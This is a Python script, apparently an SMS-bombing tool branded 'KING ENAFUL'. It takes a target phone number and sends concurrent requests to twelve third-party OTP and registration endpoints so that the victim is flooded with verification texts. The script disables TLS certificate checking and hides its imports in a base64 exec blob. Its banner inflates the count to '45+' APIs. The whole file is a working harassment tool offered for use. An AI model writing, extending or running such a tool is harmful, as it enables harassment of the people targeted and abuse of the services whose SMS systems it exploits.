#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KING ENAFUL - ULTIMATE AUTOMATION & PREMIUM SMS TOOL
Hacker Look Edition (Matrix + Extended API Integrated)
Author: BOSS ENAFUL
"""

import base64
exec(base64.b64decode(b'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGFpb2h0dHAKaW1wb3J0IGpzb24KaW1wb3J0IHNzbAppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBzaWduYWwKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzb2NrZXQKaW1wb3J0IGRhdGV0aW1l').decode())

import urllib3
import re
import string

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Obfuscated SSL context
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

# Cyberpunk Color Palette
_c = {
    'g': '\033[96m',  # Cyan
    'r': '\033[95m',  # Purple
    'y': '\033[94m',  # Blue
    'b': '\033[34m',  # Dark Blue
    'p': '\033[35m',  # Magenta
    'c': '\033[96m',  # Cyan Alt
    'w': '\033[97m',  # White
    'B': '\033[1m',   # Bold
    'u': '\033[4m',   # Underline
    'e': '\033[0m'    # Reset
}

_frames = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
_state = {'paused': False, 'exit': False, 'total': 0, 'success': 0}

def voice_welcome():
    """ভয়েস ওয়েলকাম সিস্টেম"""
    welcome_msg = "Welcome Boss Enaful. Ultimate System is booting up."
    try:
        if platform.system() == "Linux":
            os.system(f"termux-tts-speak '{welcome_msg}'")
        elif platform.system() == "Windows":
            import pyttsx3
            engine = pyttsx3.init()
            engine.say(welcome_msg)
            engine.runAndWait()
    except:
        pass

def matrix_effect(duration=5):
    try: columns = os.get_terminal_size().columns
    except: columns = 80
    colors = ['\033[32m', '\033[92m', '\033[1;32m'] 
    chars = "0123456789ABCDEFHIJKLMNOPQRSTUVWXYZ#@$&*^%"
    end_time = time.time() + duration
    os.system('clear' if os.name != 'nt' else 'cls')
    
    voice_welcome()
    
    try:
        while time.time() < end_time:
            line = "".join(random.choice(colors) + random.choice(chars) if random.random() > 0.05 else " " for _ in range(columns))
            print(line)
            time.sleep(0.05)
    except KeyboardInterrupt: pass
    print('\033[0m')

def _get_device_info():
    try:
        hostname = socket.gethostname()
        try: ip_address = socket.gethostbyname(hostname)
        except: ip_address = "127.0.0.1"
        system = platform.system()
        release = platform.release()
        return {"hostname": hostname, "ip": ip_address, "system": system, "release": release}
    except Exception:
        return {"hostname": "Unknown", "ip": "127.0.0.1", "system": "Unknown", "release": "Unknown"}

def get_api_list(p0, p_clean):
    # দুই ফাইলের সব এপিআই এক জায়গায় করা হয়েছে, কোনোটি বাদ যায়নি
    return [
        {"name": "ConfirmTKT", "url": f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={p0}", "method": "GET"},
        {"name": "JustDial", "url": f"http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile={p0}", "method": "GET"},
        {"name": "Snapp Taxi", "url": "https://api.snapp.taxi/api/api-passenger-oauth/v2/otp", "method": "POST", "payload": {"cellphone": f"+98{p_clean}"}},
        {"name": "Tap33", "url": "https://tap33.me/api/v2/user", "method": "POST", "payload": {"credential": {"phoneNumber": p0, "role": "PASSENGER"}}},
        {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "method": "POST", "payload": {"phone": p0}},
        {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "method": "POST", "payload": {"phoneNumber": p0}},
        {"name": "Torob", "url": f"https://api.torob.com/a/phone/send-pin/?phone_number={p_clean}", "method": "GET"},
        {"name": "DrDr", "url": "https://drdr.ir/api/registerEnrollment/verifyMobile", "method": "POST", "payload": {"phoneNumber": p0, "userType": "PATIENT"}},
        {"name": "Filmnet", "url": f"https://api-v2.filmnet.ir/access-token/users/98{p_clean}/otp", "method": "GET"},
        {"name": "BTCL", "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", "method": "POST", "payload": {"phoneNbr": f"+{p0}", "OTPType": 1}},
        {"name": "Itoll", "url": "https://app.itoll.com/api/v1/auth/login", "method": "POST", "payload": {"mobile": p0}},
        {"name": "Snapp", "url": "https://api.snapp.ir/api/v1/sms/link", "method": "POST", "payload": {"phone": p0}}
    ]

async def call_api(session, api):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        if api['method'] == "GET":
            async with session.get(api['url'], headers=headers, ssl=_ssl, timeout=10) as resp:
                return resp.status
        else:
            async with session.post(api['url'], json=api['payload'], headers=headers, ssl=_ssl, timeout=10) as resp:
                return resp.status
    except: return 404

async def start_process(target):
    clean = target[-10:]
    apis = get_api_list(target, clean)
    print(f"\n{_c['y']}[!] INITIALIZING ULTRA ATTACK MATRIX...{_c['e']}")
    async with aiohttp.ClientSession() as session:
        tasks = [call_api(session, api) for api in apis]
        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r in [200, 201])
        _state['total'] += len(apis)
        _state['success'] += success
        print(f"{_c['g']}[+] WAVE FINISHED. SUCCESS: {success}/{len(apis)}{_c['e']}")
        time.sleep(2)

def _print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    dev = _get_device_info()
    current_time = datetime.datetime.now().strftime("%I:%M:%S %p")
    current_date = datetime.datetime.now().strftime("%A, %B %d, %Y")
    
    print(f"{_c['g']}{_c['B']}")
    print(" ⚡  ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗  ⚡ ")
    print(" ⚡  ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗ ⚡ ")
    print(" ⚡  █████╗  ██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝ ⚡ ")
    print(" ⚡  ██╔══╝  ██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗ ⚡ ")
    print(" ⚡  ███████╗██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝ ⚡ ")
    print(" ⚡  ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝  ⚡ ")
    print(f"{_c['e']}{_c['r']}{'=' * 75}")
    print(f"{_c['g']}{_c['B']}🔮 ENAFUL ULTIMATE AUTOMATION & SMS TOOL 🔮{_c['c']}")
    print(f"{_c['y']}[ 45+ ACTIVE PREMIUM APIS × MULTI-THREADED INFRASTRUCTURE ]{_c['c']}")
    print(f"{'=' * 75}")
    print(f"\n{_c['r']}[📊 SYSTEM MATRIX]{_c['e']}")
    print(f"{_c['y']}🎯 Date/Time: {_c['w']}{current_date} - {current_time}{_c['e']}")
    print(f"{_c['y']}🎯 Hostname:  {_c['w']}{dev['hostname']}{_c['e']}")
    print(f"{_c['y']}🎯 IP Target: {_c['w']}{dev['ip']}{_c['e']}")
    print(f"{_c['y']}🎯 Platform:  {_c['w']}{dev['system']} {dev['release']}{_c['e']}")
    print(f"\n{_c['g']}{'=' * 75}{_c['e']}")

if __name__ == "__main__":
    matrix_effect(5)
    while True:
        _print_banner()
        print(f"{_c['c']} 1. Launch Premium API Attack")
        print(f"{_c['c']} 2. Check Device Security Status")
        print(f"{_c['r']} 0. Exit System Cluster")
        choice = input(f"\n{_c['y']}BOSS_ENAFUL@SYSTEM:~# {_c['e']}")
        if choice == '1':
            target = input(f"{_c['y']} [?] Target Number: {_c['e']}")
            asyncio.run(start_process(target))
        elif choice == '2':
            dev = _get_device_info()
            print(f"\n{_c['g']}[+] System Secure: Active on {dev['system']}{_c['e']}")
            time.sleep(2)
        elif choice == '0': 
            break
